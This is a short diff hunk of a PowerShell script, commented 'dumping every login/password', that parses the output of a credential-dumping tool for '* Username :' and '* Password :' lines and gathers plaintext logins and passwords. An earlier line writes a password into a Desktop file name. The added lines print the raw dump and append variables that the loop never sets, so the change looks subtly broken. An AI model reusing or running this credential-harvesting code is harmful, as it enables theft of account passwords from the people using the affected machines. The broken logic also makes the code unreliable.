@@ -42,13 +42,18 @@ echo $null > "$HOME/Desktop/$password"
 # dumping every login/password
 $logins = @()
 $passwords = @()
+echo "out is : $out"
 for ($i = 0; $i -lt $out.length; $i++) {
 	if ($out[$i] -match '\* Username : (.+)$') {
 		if ($i+2 -lt $out.length -and $out[$i+2] -match '\* Password : (.+)$') {
-			$out[$i] | Select-String '\* Username : (.+)$' -AllMatches |
+      $out[$i] | Select-String '\* Username : (.+)$' -AllMatches |
 				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $logins += $_.Value }
 			$out[$i+2] | Select-String '\* Password : (.+)$' -AllMatches |
 				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $passwords += $_.Value }
+      if ($password -ne "(null)") {
+        $logins += $login
+        $passwords += $password
+      }
 		}
 	}
 }
